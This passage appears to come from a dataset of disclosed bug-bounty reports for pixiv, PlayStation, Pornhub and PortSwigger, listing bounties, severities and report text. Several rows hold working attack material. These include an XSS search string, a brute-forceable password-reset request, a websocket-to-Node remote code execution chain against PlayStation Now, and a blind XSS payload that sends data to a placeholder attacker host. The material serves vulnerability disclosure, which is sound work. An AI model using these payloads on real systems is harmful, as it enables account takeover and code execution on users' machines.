In the Search Bar Add ['-confirm(3)-'] and the URL is https://www.pixiv.net/en/tags/%5B'-confirm(3)-'%5D#discover

Impact
Steal Cookie4 attachments:F672639: image3.jpegF672640: image1.jpegF672641: image0.pngF672642: image2.png",https://hackerone.com/reports/766633,Tokyo,Japan,Tokyo,2019,12,31,23,31
pixiv,51-100,0.0,10m-50m,"$1,000.00",High,7.95,Weak Password Recovery Mechanism for Forgotten Password,Reset any password,"noxx  submitted a report to pixiv.Sep 29th (3 years ago)Summary:
When I try to reset the password, the verification code of the mailbox is 6 digits, and there is no limit on the number of submissions, so I can reset the password of any user.
Steps To Reproduce:
1.input the email  reset password url.
Image F595146: 0.png 258.58 KiBZoom in Zoom out Copy Download
click  the ""submit"" button
Image F595147: 1.png 474.00 KiBZoom in Zoom out Copy Download
input the email verification code and try to guess the verification code, but I won’t be able to continue using it after I try it a few times.
Image F595148: 2.png 279.85 KiBZoom in Zoom out Copy Download
2.After trying, I found that there was no such submission restriction when the password was reset in the third step.
Repeat the above steps, the only difference is that you need to enter the correct verification code.
Image F595160: 3.png 481.84 KiBZoom in Zoom out Copy Download
It can be seen that when we reset the password in the last step, the verification code will still be sent, that is, the verification code will be sent to the server for validity verification in the last step, and the verification code of the last step is not limited by the number of submissions. In other words, we can guess the verification code.
I wrote a python script to verify the vulnerability, you only need to enter the following parameters to verify the vulnerability.
parameter：tt code_id code phpsession
python: poc.py (F595166)
video: Video F595172: 4.mp4 41.66 MiBZoom in Zoom out Copy Download
Supporting Material/References:
none

[attachment / reference]

Impact
Reset any user's password6 attachments:F595146: 0.pngF595147: 1.pngF595148: 2.pngF595160: 3.pngF595166: poc.pyF595172: 4.mp4nochnoidozor   posted a comment. Sep 30th (3 years ago)Hi @noxx,
Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Kind regards,
@nochnoidozor kobo   posted a comment. Oct 1st (3 years ago)Hi @noxx,
Thanks for reporting.
I took a look at your report, and have tested on my own to see if I can reproduce this. However, I was uncertain of a few things.

input the email verification code and try to guess the verification code, but I won’t be able to continue using it after I try it a few times.

We have a limit to the number of attempts for the authentication_code, and once the limit is reached, the authentication_code will be revoked.

After trying, I found that there was no such submission restriction when the password was reset in the third step.

What do you mean by this? What did you do that enabled you to submit without restrictions?noxx   posted a comment. Updated Oct 1st (3 years ago)Yes, there is a limit on the number of authentication_codes in the second step of password reset.
This is the request message for the reset password. You can see the new_password_1 and authentication_code parameters in this request:
Code 1.53 KiBWrap lines Copy Download1POST /reset_pass.php?code_id=9483983&code=6d02e9f496e38173c3663e45e80745b0 HTTP/1.1
2Host: www.pixiv.net
3Connection: close
4Content-Length: 167
5Cache-Control: max-age=0
6Origin: https://www.pixiv.net
7Upgrade-Insecure-Requests: 1
8Content-Type: application/x-www-form-urlencoded
9User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
10Sec-Fetch-Mode: navigate
11Sec-Fetch-User: ?1
12Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
13Sec-Fetch-Site: same-origin
14Referer: https://www.pixiv.net/
15Accept-Encoding: gzip, deflate
16Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
17Cookie: first_visit_datetime_pc=2019-10-01+20%3A07%3A27; p_ab_id=3; p_ab_id_2=2; p_ab_d_id=1227808330; _ga=GA1.2.1703015906.1569928121; _gid=GA1.2.634922121.1569928121; device_token=168838d396f304fa55c9b66476eefe9d; c_type=10; a_type=0; b_type=0; privacy_policy_agreement=0; login_ever=yes; yuid_b=NSB2kYU; __utma=235335808.1703015906.1569928121.1569928203.1569928203.1; __utmc=235335808; __utmz=235335808.1569928203.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmv=235335808.|2=login%20ever=yes=1^3=plan=normal=1^6=user_id=44289328=1^9=p_ab_id=3=1^10=p_ab_id_2=2=1^11=lang=zh=1; __utmt=1; PHPSESSID=c82f44b74d511c4e04111a2b7477c25d; login_bc=1; __utmb=235335808.7.9.1569928313839
18
19tt=b7296b8d2e8f5bcfa4d749e07ec4a052&mode=reset&authentication_code=708718&new_password_1=123123aaa&new_password_2=123123aaa&submit=%E3%80%80%E5%8F%91%E9%80%81%E3%80%80
There is no limit to the number of authentication_code parameters in this request. With this request, the verification code can be submitted all the time.noxx   posted a comment. Oct 1st (3 years ago)There are three steps to reset the password.
Image F596459: 4.png 45.21 KiBZoom in Zoom out Copy Download
In the step 2 , there have limit to the number of attempts for the authentication_codes, but there is no such restriction in step 3. (Because step 3 also contains the authentication code parameter).
step 2 can be ignored, so we can submit the authentication_codes indefinitely in step 3.
Image F596470: 5.png 54.11 KiBZoom in Zoom out Copy Download2 attachments:F596459: 4.pngF596470: 5.pngkobo   changed the status to Triaged. Updated Oct 2nd (3 years ago)I took a look again, this time on the step 3 as you described, and have confirmed that this is real!
I think this allows an attacker to change a password for an arbitrary account in a decently realistic time through brute-forcing the 6 digit code, further leading to an account takeover.
Please allow us a few days to fix this. Meanwhile, please refrain from further attempting / experimenting this attack.
Thanks again for reporting, and we'll get back to you for the bounty within a few days.kobo   posted a comment. Oct 3rd (3 years ago)@noxx We have deployed a fix for this issue. Could you take a look and see if the issue has been resolved?
Thanks,noxx   posted a comment. Oct 3rd (3 years ago)@kobo I've verified the fixpixiv  rewarded noxx with a $1,000 bounty. Oct 3rd (3 years ago)Hi @noxx,
Thanks for submitting!
We were able to reproduce this issue, and have confirmed that this is a valid vulnerability.
Therefore, we have issued you a bounty of $1000 based on our bounty table.
Thanks,kobo   closed the report and changed the status to Resolved. Oct 3rd (3 years ago)Thanks for confirming! Now closing as resolved.kobo   requested to disclose this report. Mar 9th (2 years ago)noxx   agreed to disclose this report. Mar 31st (2 years ago)  This report has been disclosed. Mar 31st (2 years ago)",https://hackerone.com/reports/703972,Tokyo,Japan,Tokyo,2019,9,29,21,45
PlayStation,5001-10000,0.0,200m-1b,"$1,200.00",High,8.1,Missing Authorization,Access token stealing.,bugdiscloseguys  submitted a report to PlayStation.Mar 16th (3 years ago)Summary by bugdiscloseguysThis was found In collaboration with @iamnoooob.,https://hackerone.com/reports/821896,California,United States,Foster City,2020,3,16,21,23
PlayStation,5001-10000,0.0,200m-1b,"$10,000.00",High,7.95,Use After Free,Use-After-Free In IPV6_2292PKTOPTIONS leading To Arbitrary Kernel R/W Primitives,"theflow0  submitted a report to PlayStation.Mar 21st (3 years ago)Summary
Due to missing locks in option IPV6_2292PKTOPTIONS of setsockopt , it is possible to race and free the struct ip6_pktopts  buffer, while it is being handled by ip6_setpktopt. This structure contains pointers (ip6po_pktinfo) that can be hijacked to obtain arbitrary kernel R/W primitives. As a consequence, it is easy to have kernel code execution. This vulnerability is reachable from WebKit sandbox and is available in the latest FW, that is 7.02.
Attachment
Attached is a Proof-Of-Concept that achieves a Local Privilege Escalation on FreeBSD 9 and FreeBSD 12.
Impact

In conjunction with a WebKit exploit, a fully chained remote attack can be achieved.
It is possible to steal/manipulate user data.
Dump and run pirated games.
1 attachment:F755558: exploit.c",https://hackerone.com/reports/826026,California,United States,Foster City,2020,3,21,16,40
PlayStation,5001-10000,0.0,200m-1b,"$15,000.00",Critical,9.6,Code Injection,Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application,"parsiya  submitted a report to PlayStation.May 13th (3 years ago)parsiya   updated the severity to critical (9.6). May 13th (3 years ago)parsiya   closed the report and changed the status to Not Applicable. May 13th (3 years ago)hacker-01 PlayStation staff  reopened this report. May 13th (3 years ago)hacker-01 PlayStation staff  changed the status to Triaged. May 13th (3 years ago)hacker-01 PlayStation staff  posted a comment. May 19th (3 years ago)parsiya   posted a comment. May 19th (3 years ago)parsiya   posted a comment. May 19th (3 years ago)PlayStation  rewarded parsiya with a $15,000 bounty. May 21st (2 years ago)parsiya   posted a comment. May 21st (2 years ago)parsiya   posted a comment. Jun 7th (2 years ago)serv   closed the report and changed the status to Resolved. Jun 25th (2 years ago)parsiya   posted a comment. Jun 28th (2 years ago)parsiya   requested to disclose this report. Jun 28th (2 years ago)serv   posted a comment. Aug 19th (2 years ago)parsiya   posted a comment. Aug 20th (2 years ago)parsiya   posted a comment. Aug 20th (2 years ago)hacker-01 PlayStation staff  posted a comment. Sep 9th (2 years ago)parsiya   posted a comment. Sep 10th (2 years ago)serv   posted a comment. Oct 14th (2 years ago)parsiya   posted a comment. Oct 20th (2 years ago)serv   posted a comment. Nov 20th (2 years ago)parsiya   posted a comment. Nov 21st (2 years ago)serv   agreed to disclose this report. Dec 4th (2 years ago)  This report has been disclosed. Dec 4th (2 years ago)Summary by parsiyaSummary
The PlayStation Now application version 11.0.2 is vulnerable to remote code execution (RCE). Any website loaded in any browser on the same machine can run arbitrary code on the machine through a vulnerable websocket connection.

The local websocket server at localhost:1235 does not check the origin of incoming requests.

This allows websites loaded in browsers on the same machine to send requests to the websocket server.
Websockets are not bound by the Same-Origin Policy so the websocket server has to do this manually.


psnow launches an Electron application named AGL.

It's possible to tell AGL to load a specific website with a command sent to the websocket server.
As a result, the websites above can tell AGL to load any remote URL.
It's also possible to tell AGL to run any local application via the setUrlDefaultBrowser command.


The AGL Electron application has nodeIntegration: true so JavaScript running in any loaded URL can spawn new processes.

So any URL loaded in the AGL application can run code on the target machine.



Chaining these three issues gives us RCE.
Description
The PlayStation Now application (psnow moving forward) is an online streaming application for playing PlayStation games. Version 11.0.2 is the current version at the time of writing. The latest version can be downloaded from https://download-psnow.playstation.com/downloads/psnow/pc/latest.
It has two major components: QAS and AGL.
QAS
QAS is an executable named psnowlauncher.exe and is a Qt5 desktop application. This is the main application that is executed when the user runs psnow. The default installation location is C:\Program Files (x86)\PlayStationNow\psnowlauncher.exe.
Note: Running it in a Virtual Machine (VM) returns a warning. This can be ignored for this walkthrough.
After launch, it runs a different application called AGL. The following picture is the complete list of processes in Process Monitor.
Processes in procmon:
{F827146}
The QAS application also runs a websocket server at localhost:1235. netstat -anb in an elevated command line tells us about it:
websocket server:
{F827147}
AGL
AGL is an Electron application. In a typical execution, it's spawned by QAS. In the current version, it's run with this url command line parameter:

""C:\Program Files (x86)\PlayStationNow\agl\agl.exe"" --url=https://psnow.playstation.com/app/1.10.43/105/00d3603f8/

This is the URL of the page that will be initially loaded by the AGL application.
AGL execution
{F827149}
Issue 1: nodeIntegration Set to true
nodeIntegration is the ability for the JavaScript running in an Electron BrowserWindow to access the Node.js APIs. The default value is false but it is set to true in AGL. Any JavaScript loaded by AGL will be able to spawn processes on the machine. This can lead to arbitrary code execution. The AGL application performs no checks on what URLs it loads.
We can check this by running AGL from the command line with a URL that contains some Node code. The following code spawns a new processes and runs the Windows Calculator app (calc).
Code 213 Bytes1<html>
2    <head>
3        <title>This should pop calc on Windows</title>
4    </head>
5    <body>
6        <script>
7            require('child_process')
8            .exec('calc')
9        </script>
10    </body>
11</html>
I have stored this payload in an S3 bucket. If we load that remote URL in AGL we can see calc spawning. To reproduce, run the following command in a VM and see AGL running the calculator application:
""C:\Program Files (x86)\PlayStationNow\agl\agl.exe"" --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html
Popping calc:
{F827156}
We can see the new processes in Process Monitor:
{F827151}
This is not that useful. We can run code on our own machine, WOW! As Raymond Chen said It rather involved being on the other side of this airtight hatchway.
Proxying The Applications
We can proxy psnow with Burp. Use the Windows proxy settings (WinINET proxy settings).

Run control.exe inetcpl.cpl,,4. This opens the Windows proxy settings without having to open Internet Explorer.
Click on LAN Settings and set the proxy.

Make sure nothing under Automatic Configuration is checked.
Make sure the Bypass proxy server for local addresses is NOT checked.


Set the proxy to the listener, Burp's default is 127.0.0.1:8080.
Add Burp's Certificate Authority (CA) to the Windows certificate store.

https://portswigger.net/support/installing-burp-suites-ca-certificate-in-internet-explorer
The instructions mention Internet Explorer but it's actually for Windows.



Identifying Traffic in Burp
In Burp, we will see traffic to/from both QAS and AGL. There is other traffic (e.g, browser traffic, Windows update). The traffic from psnow has the word gkApollo in its User-Agent header.
The user-agent for requests coming from the two applications has more indicators:

QAS is the Qt5 app and has QtWebEngine/5.5.1.
AGL is based on Electron and it has Electron/1.4.16 and playstation-now/0.0.0.

I am using a Burp extension named Request Highlighter to highlight requests based on these words in the user-agent.
In my setup, AGL (Electron) is yellow and QAS (Qt5) is blue.
{F827153}
Local Websocket Server
QAS starts a local websocket server on port 1235. Then the website loaded in AGL (in this case ""psnow.playstation.com/app/"") connects to it and sends commands to the server.
Issue 2: Local Websocket Server does not Check the Origin Header
This is a vulnerable setup for seamless communication between a website and a desktop application. A website sends requests to a local webserver to do something (e.g., launch an application). This setup is vulnerable if the local server does not check the Origin header and/or where the request is coming from.
Some examples of other vulnerable setups:
Tavis Ormandy from Google Project Zero found a very similar setup in Logitech Options.

https://bugs.chromium.org/p/project-zero/issues/detail?id=1663

Another by TavisO for TrendMicro. Not websocket but involved a local webserver: https://bugs.chromium.org/p/project-zero/issues/detail?id=693
Zoom used a local webserver to automatically launch the application from the website. Disclosure by Jonathan Leitschuh.

https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5

Why is this bad? Any website can send these commands. This means I can put JavaScript code on my own website. If a user running psnow opens my website on the same machine (in any browser), my website connects to http://localhost:1235 and sends requests to the websocket server. These requests will be processed.
Yet Another Chat Application as Proof of Concept
I stole the client code of a websocket chat app and modified it to simulate the evil website. This small app connects to ws://localhost:1235, prints any message received and allows us to send messages at will. You can see the source at:

https://[redacted].s3.amazonaws.com/agl-poc/chat-ws.html
Open the page in a browser in a different machine and see the source. It's simple enough that I could understand it.


Start the psnow app in a VM.
Open the above URL in a browser in the same VM.
See the websocket messages from the psnow app in the browser.

If we keep the chat app running, it will keep printing messages received from the client.


Send any message to the local server via the text field.

{F827145}
Websocket Messages
Now we need to look into the websocket messages and how we can exploit them.
After opening the initial URL at https://psnow.playstation.com/app/1.10.43/105/00d3603f8/ we can see the Connection: Upgrade request to this server from psnow.playstation.com. This is coming from the psnow website loaded in AGL. The initial request is a typical websocket handshake.
{F827150}
Now we can switch to the Proxy > Websockets history tab in Burp to see the websocket messages.
{F827152}
All the requests are in JSON (probably created by JSON.stringify). The interesting ones start with command. For example:
Code 87 Bytes1{
2  ""command"": ""isMicConnected"",
3  ""params"": {},
4  ""source"": ""AGL"",
5  ""target"": ""QAS""
6}

command: What to do.
params: Command parameters.
source: The program issuing the command.
target: The program running the command.

Both target and source can be the same app. I do not think it really matters what the source is. I think only target is mandatory.
We can search for more commands in websocket messages. The most important command is setUrl. There are more commands in the source of the Electron app (unpack app.asar and search for commandHandler) but this is the most useful along with setUrlDefaultBrowser (opens a URL in the default browser on the machine).
{F827154}
Code 152 Bytes1{
2  ""command"": ""setUrl"",
3  ""params"": {
4    ""url"": ""https://psnow.playstation.com/app/1.10.43/105/00d3603f8/""
5  },
6  ""source"": ""AGL"",
7  ""target"": ""QAS""
8}
This is AQL telling QAS to load this URL. QAS will then go and load that URL. We can send this request to Burp Repeater and send the message again with a different URL. For example, let's tell QAS to load https://example.net.
{F827155}
But this is not fun. We want AGL to load websites and not QAS. WHAT IF we switched target and source?
Code 89 Bytes1{""command"":""setUrl"",""params"":{""url"":""https://example.net""},""source"":""QAS"",""target"":""AGL""}
This command will tell AGL (the Electron app) to load example.net. The gif has been minimized, please click on it to enlarge it:
{F827144}
Later, I found out that we can use another TavisO bug to get RCE another way. https://bugs.chromium.org/p/project-zero/issues/detail?id=693
We can abuse the setUrlDefaultBrowser command. It gets passed to shell.openExternal(url) and allows the file scheme.
So the following command should pop calc:
Code 120 Bytes1{""command"":""setUrlDefaultBrowser"",""params"":{""url"":""file:///c:/windows/system32/calc.exe""},""source"":""QAS"",""target"":""AGL""}
Note: QAS does not have this command.
Websockets are not bound by the Same-Origin Policy so any website can send these messages. For an explanation please see https://blog.securityevaluators.com/websockets-not-bound-by-cors-does-this-mean-2e7819374acc.
Issue 3: You Can Tell AGL to Load Arbitrary Websites
A single websocket message is enough to make AGL load any URL. There are no restrictions here. This is not great, considering we saw what bad code on a website can do to AGL.
Putting Everything Together
So far we have established three things:

If a website with Node code is loaded in AGL, we can run arbitrary on the target's machine.
Any website opened in the browser on a machine with psnow running can connect to the local websocket and send messages.
A websocket command with setUrl or setUrlDefaultBrowser can tell AGL to load any URL.

Possible Attack Scenario

User is running psnow on their machine.

Note that when the users close the psnow window it gets minimized to tray and is still running. So there's a good chance that psnow is running  if they have used it in the same session. The websocket server is still running when the application is minimized.


The user opens a website in their browser. Any browser will do.

Someone can post a link to a website with bad code in chat/Discord, it could be a link on forums. The possibilities are endless.


The website in the browser connects to the websocket server at ws://localhost:1235.
The website sends a message to the websocket server. The message tells AGL to load another website that contains node code.

{""command"":""setUrl"",""params"":{""url"":""https://[redacted].s3.us-east-1.amazonaws.com/node.html""},""source"":""QAS"",""target"":""AGL""}
Alternatively, it can abuse the setUrlDefaultBrowser command.


AGL loads the new website. Arbitrary code runs on the user's machine.
???
RCE.

Steps To Reproduce:
If you have read up until here, you deserve a calc popping gif.

Run psnow in a VM.
Go to the following URL in a browser on the same machine:

https://[redacted].s3.amazonaws.com/agl-poc/calc-ws.html


Watch calc pop.
Optionally, paste the following command in the text field and press send to see calc pop again.

{""command"":""setUrl"",""params"":{""url"":""https://[redacted].s3.us-east-1.amazonaws.com/node.html""},""source"":""QAS"",""target"":""AGL""}
You can also do other fun things like enabling dev tools.



The code in calc-ws is similar to the chat code. After the socket to the local websocket server opens, the payload above is sent. See the modification heres:
Code 384 Bytes1let url = 'ws://localhost:1235/'
2
3let socket = new WebSocket(url);
4
5let payload = '{""command"":""setUrl"",""params"":{""url"":""https://[redacted].s3.us-east-1.amazonaws.com/node.html""},""source"":""QAS"",""target"":""AGL""}';
6
7// send the payload when the socket is opened.
8socket.onopen = function(event) {
9  showMessage('before payload');
10  socket.send(payload);
11  showMessage('after payload');
12};
The following gif shows the whole chain. Again, please see it in full-size.
{F827148}
Bonus: Minor Issue 0: Websocket Server Listening on 0.0.0.0
The application is listening on all interfaces (0.0.0.0) which is problematic. This is also not fun because the Windows firewall prompt will pop up when its executed for the first time. Meaning anyone who can contact this port might be able to send commands to this websocket server.
Remediation or How Can We Fix This?

Quick and effective win: The local websocket server should validate the Origin header of the incoming request and only allow requests from good Origins specified in a list.

This is the same recommendation by TavisO in https://bugs.chromium.org/p/project-zero/issues/detail?id=1663. And he is much smarter than I will ever be.


Bonus win: Do not listen on all interfaces, bind the server to localhost.

Impact
Attackers can run code on users' machines. They can get to the other side of the airtight hatchway.Show more",https://hackerone.com/reports/873614,California,United States,Foster City,2020,5,13,18,44
PlayStation,5001-10000,0.0,200m-1b,"$1,000.00",High,7.4,Cross-site Scripting (XSS) - Reflected,Reflected XSS on transact.playstation.com using postMessage from the opening window,vakzz  submitted a report to PlayStation.Jun 17th (2 years ago),https://hackerone.com/reports/900619,California,United States,Foster City,2020,6,17,14,0
PlayStation,5001-10000,0.0,200m-1b,"$1,000.00",High,7.95,Violation of Secure Design Principles,Authorization Token on PlayStation Network Leaks via postMessage function,nnez  submitted a report to PlayStation.Mar 22nd (3 years ago),https://hackerone.com/reports/826394,California,United States,Foster City,2020,3,22,13,27
PlayStation,5001-10000,0.0,200m-1b,"$10,000.00",High,7.95,Double Free,SOCK_RAW sockets reachable from Webkit process allows triggering double free in IP6_EXTHDR_CHECK,theflow0  submitted a report to PlayStation.Jul 26th (2 years ago),https://hackerone.com/reports/943231,California,United States,Foster City,2020,7,26,16,18
PlayStation,5001-10000,0.0,200m-1b,"$1,000.00",High,7.95,Server-Side Request Forgery (SSRF),SSRF chained to hit internal host leading to another SSRF which allows to read internal images.,bugdiscloseguys  submitted a report to PlayStation.Mar 21st (3 years ago),https://hackerone.com/reports/826097,California,United States,Foster City,2020,3,21,19,34
PlayStation,5001-10000,0.0,200m-1b,"$3,000.00",Medium,5.9,None,SMAP bypass,m00nbsd  submitted a report to PlayStation.Dec 1st (2 years ago),https://hackerone.com/reports/1048322,California,United States,Foster City,2020,12,1,16,19
Pornhub,1001-5000,0.0,200m-1b,"$1,500.00",No value,0.0,Code Injection,(Pornhub & Youporn & Brazzers ANDROID APP) : Upload Malicious APK / Overrite Existing APK  / Android BackOffice Access ,dremos  submitted a report to Pornhub.May 31st (6 years ago),https://hackerone.com/reports/142352,Quebec,Canada,Montreal,2016,5,31,20,47
Pornhub,1001-5000,0.0,200m-1b,$150.00,No value,0.0,Cross-site Scripting (XSS) - Generic, Same-Origin Method Execution bug in plupload.flash.swf on /insights,zephrfish  submitted a report to Pornhub.May 12th (7 years ago),https://hackerone.com/reports/138226,Quebec,Canada,Montreal,2016,5,12,9,19
Pornhub,1001-5000,0.0,200m-1b,"$1,000.00",No value,0.0,Improper Authentication - Generic,[IDOR] Deleting other users comment,"mikkz  submitted a report to Pornhub.May 12th (7 years ago)Hello,
Normally you cannot delete comments if you post on someones stream and i have found a way to delete others comment.
PoC:
https://youtu.be/m_xEE9vcxKA
Let me know if you cannot reproduce it ! 
Thanks!
Mikko",https://hackerone.com/reports/138243,Quebec,Canada,Montreal,2016,5,12,10,25
Pornhub,1001-5000,0.0,200m-1b,$750.00,No value,0.0,Improper Authentication - Generic,[idor] Profile Admin can pin any other user's post on his stream wall,indoappsec  submitted a report to Pornhub.May 14th (7 years ago),https://hackerone.com/reports/138852,Quebec,Canada,Montreal,2016,5,14,21,22
Pornhub,1001-5000,0.0,200m-1b,"$1,500.00",No value,0.0,Improper Authentication - Generic,"[idor] Unauthorized Read access to all the private posts(Including Photos,Videos,Gifs)",indoappsec  submitted a report to Pornhub.Jul 1st (6 years ago),https://hackerone.com/reports/148764,Quebec,Canada,Montreal,2016,7,1,22,49
Pornhub,1001-5000,0.0,200m-1b,"$20,000.00",No value,0.0,Code Injection,[phpobject in cookie] Remote shell/command execution,static  submitted a report to Pornhub.May 30th (6 years ago),https://hackerone.com/reports/141956,Quebec,Canada,Montreal,2016,5,30,3,56
Pornhub,1001-5000,0.0,200m-1b,"$10,000.00",No value,0.0,Information Disclosure,[RCE] Unserialize to XXE - file disclosure on ams.upload.pornhub.com,"5haked  submitted a report to Pornhub.Jun 1st (6 years ago)Summary by 5hakedI exploited the callback parameter on video upload and was able to perform an elaborate form of object injection in multiple Pornhub sites. By using the SimpleXMLElement class in a specific flow, I was able to perform an Out-Of-Band XXE attack and by so, fetch the full content of private, local files on the server.
In addition to the local file disclosure, by altering the created class slightly, I was also able to achieve the following core abilities on the server:

SSRF
Blind Sql execution (Execute query on every Pornhub’s DB without receiving the output of the command)

By utilizing the combination of all 3 flows, I was eventually entirely capable to execute arbitrary code on pornhub.com.
My blog about it:
https://5haked.blogspot.com",https://hackerone.com/reports/142562,Quebec,Canada,Montreal,2016,6,1,21,19
Pornhub,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,"[reflected xss, pornhub.com] /blog, any",zephrfish  submitted a report to Pornhub.Aug 19th (7 years ago),https://hackerone.com/reports/83566,Quebec,Canada,Montreal,2015,8,19,23,21
Pornhub,1001-5000,0.0,200m-1b,"$1,500.00",No value,0.0,Information Disclosure,[ssrf] libav vulnerable during conversion of uploaded videos,agarri_fr  submitted a report to Pornhub.Jan 17th (7 years ago),https://hackerone.com/reports/111269,Quebec,Canada,Montreal,2016,1,17,15,36
Pornhub,1001-5000,0.0,200m-1b,$250.00,No value,0.0,Cross-site Scripting (XSS) - Generic,"[xss, pornhub.com] /user/[username], multiple parameters",zephrfish  submitted a report to Pornhub.Nov 19th (7 years ago),https://hackerone.com/reports/100550,Quebec,Canada,Montreal,2015,11,19,19,35
Pornhub,1001-5000,0.0,200m-1b,$250.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,"[xss] pornhubpremium.com, /redeem?code= URL endpoint ",jon_bottarini  submitted a report to Pornhub.Feb 1st (6 years ago),https://hackerone.com/reports/202536,Quebec,Canada,Montreal,2017,2,1,5,42
Pornhub,1001-5000,0.0,200m-1b,$100.00,No value,0.0,Command Injection - Generic,CSV Macro injection in Video Manager (CEMI),awake  submitted a report to Pornhub.May 11th (7 years ago),https://hackerone.com/reports/137850,Quebec,Canada,Montreal,2016,5,11,13,42
Pornhub,1001-5000,0.0,200m-1b,$750.00,No value,0.0,Improper Authentication - Generic,Disclosure of private photos/albums - http://www.pornhub.com/album/show_image_box,"cyber-guard  submitted a report to Pornhub.Sep 11th (6 years ago)Summary by cyber-guardAn endpoint allowing to view any private albums/photos was identified.
Check out the infrastructure monitoring platform BugLabs.me for bounty hunters - https://buglabs.me",https://hackerone.com/reports/167582,Quebec,Canada,Montreal,2016,9,11,15,30
Pornhub,1001-5000,0.0,200m-1b,$50.00,No value,0.0,Information Disclosure,[crossdomain.xml] Dangerous Flash Cross-Domain Policy,zephrfish  submitted a report to Pornhub.Dec 16th (7 years ago),https://hackerone.com/reports/105655,Quebec,Canada,Montreal,2015,12,16,20,5
Pornhub,1001-5000,0.0,200m-1b,"$1,500.00",No value,0.0,Improper Authentication - Generic,[IDOR] post to anyone even if their stream is restricted to friends only,mikkz  submitted a report to Pornhub.May 11th (7 years ago),https://hackerone.com/reports/137954,Quebec,Canada,Montreal,2016,5,11,17,12
Pornhub,1001-5000,0.0,200m-1b,$250.00,No value,0.0,Cross-site Scripting (XSS) - Generic,"Cross Site Scripting - On Mouse Over, Blog page",zephrfish  submitted a report to Pornhub.Nov 19th (7 years ago),https://hackerone.com/reports/100552,Quebec,Canada,Montreal,2015,11,19,19,43
Pornhub,1001-5000,0.0,200m-1b,$500.00,High,7.95,Cross-site Scripting (XSS) - Stored,Blind Stored XSS against Pornhub employees using Amateur Model Program,"sp1d3rs  submitted a report to Pornhub.Mar 27th (6 years ago)Summary by sp1d3rsI was able to turn Stored Self-XSS in the MPP (Model Payment Program) application input form field into the Blind Stored XSS without user interaction against employees who process the MPP applications. The payload was written manually to bypass some filters, with crossdomain request demonstration.
Used payload skeleton, which can be helpful for someone (it can be modified in different ways, using eval, etc.):
Code 136 Bytes1""autofocus/onfocus=""thr=new XMLHttpRequest();thr.open('GET','//[yourhost]/[yourhook].php?t=&d='+document.domain,true);thr.send(null);""//
The PornHub team was very responsible and fixed the issue fast. Thanks to the team for the bounty and cool swag!",https://hackerone.com/reports/216379,Quebec,Canada,Montreal,2017,3,27,10,55
Pornhub,1001-5000,0.0,200m-1b,$50.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Cross Site Scripting – Album Page,zephrfish  submitted a report to Pornhub.Aug 17th (7 years ago),https://hackerone.com/reports/82929,Quebec,Canada,Montreal,2015,8,17,18,54
PortSwigger Web Security,11-50,0.0,1m-10m,"$1,500.00",Medium,5.45,Man-in-the-Middle,burp does not validate the common name of the presented collaborator server certificate,"morisson  submitted a report to PortSwigger Web Security.Apr 14th (5 years ago)Burp is not validating correctly if the presented certificate in collaborator server. It warns if it is a self signed one, but if it is a legitimate one (any valid CA), it appears not to be checking the CN.
This is an issue for the polling service, since it allows for the connection to be intercepted and burp will happily send through the polling request.
For PoC, just use a valid certificate for a completely different domain than the one used on the burp collaborator server, and connect to it. All checks will be ok, and when polling the server (using the scanner for instance), there's no warning or failure, and burp connects.
I haven't extensively tested all possible options, but using a valid wildcard certificate from a totally different domain works.
(note: there's also the functional bug of burp stating the connections are ok, but the target being tested will then fail to connect to any TLS service on the collaborator)
Impact
If the attacker is able to perform a MITM on the tester (either adjacent to him, or to the collaborator server, or somewhere along the path), he will be able to intercept the HTTPS polling connection to the collaborator server, and potentially obtain the records.4 attachments:F285736: collab_config.pngF285737: wrong_domain_certificate_ok.pngF285738: tls_error.pngF285741: not_this_domain.png",https://hackerone.com/reports/337680,England,United Kingdom,Knutsford,2018,4,14,9,38
PortSwigger Web Security,11-50,0.0,1m-10m,"$1,000.00",Medium,5.45,Man-in-the-Middle,Build fetches jars over HTTP,"jlleitschuh  submitted a report to PortSwigger Web Security.Mar 7th (4 years ago)CWE-829: Inclusion of Functionality from Untrusted Control Sphere
CWE-494: Download of Code Without Integrity Check
PortSwigger maintains several Open Source Projects under the PortSwigger GitHub organization. Some of these projects contain build files that indicate that some of these projects are resolving dependencies over HTTP instead of HTTPS. This allows these artifacts to be potentially MITMed to maliciously compromise them and infect the build artifacts that are produced. Additionally, if any of these JARs or other dependencies were compromised, any developers or production servers using these could continue to be infected past updating to fix this.
Description:
This attack leverages the build infrastructure loading dependencies over HTTP without any other sort of integrity check to allow them to be maliciously compromised.
This isn't just theoretical
POC code has existed since 2014 to maliciously compromise a JAR file inflight.
See:

https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/
https://github.com/mveytsman/dilettante

MITM Attacks Increasingly Common
See:

https://serverfault.com/a/153065
https://security.stackexchange.com/a/12050
Comcast continues to inject its own code into websites you visit (over HTTP)

Source Locations
Insecure Download
TeamCity Integration

https://github.com/PortSwigger/burp-teamcity-integration/blob/4fc37ab14575ab9b54cf27e8ecac0923fa1ed3e0/pom.xml#L11-L22

Jenkins Integration

https://github.com/PortSwigger/burp-jenkins-integration/blob/0151b131807d46ef0b55b172a1f23f988cd27bac/pom.xml#L17-L29

Insecure Upload
Insecure upload of artifacts is pretty much always accompanied by credentials. Since these credentials are sent over HTTP, they are transmitted in plaintext and should be considered compromised.
Jenkins Integration

https://github.com/PortSwigger/burp-jenkins-integration/blob/0151b131807d46ef0b55b172a1f23f988cd27bac/pom.xml#L61-L66

Fix and Public Disclosure
